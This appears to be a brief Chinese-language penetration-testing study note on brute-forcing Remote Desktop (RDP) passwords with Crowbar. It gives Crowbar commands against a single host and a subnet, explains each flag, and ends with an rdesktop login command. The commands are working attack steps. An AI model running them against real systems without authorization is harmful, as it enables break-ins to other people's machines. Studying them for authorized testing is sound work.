# Password Attacks

## RDP Attacks
> 19.3.2 Remote Desktop Protocol Attack with Crowbar 
- 工具：Crowbar
- 安装：`sudo apt install crowbar `
- 使用：

**爆破单主机：**
```
# 当爆破 RDP 服务时，线程最好使用 1，因为 RDP 不能很好地处理多线程，**如果使用多线程，会造成误报和漏报**
>> crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1 -v

Command explain:
-b 协议
-s 目标
-u 用户名
-C 密码字典
-n 线程
-v 详细模式
```
**爆破网段(多个主机)**
```
>> crowbar -b rdp -s 10.11.0.22/32 -u admin -d -C ~/password-file.txt -n 1 

Command explain:
-d port discover，会在爆破之前根据-b 指定的服务去扫描端口，如果端口未开放则跳过这台主机
```

爆破成功之后使用rdesktop尝试登录：
```
rdesktop -g 50% -u Administrator -p {password} {IP}
```
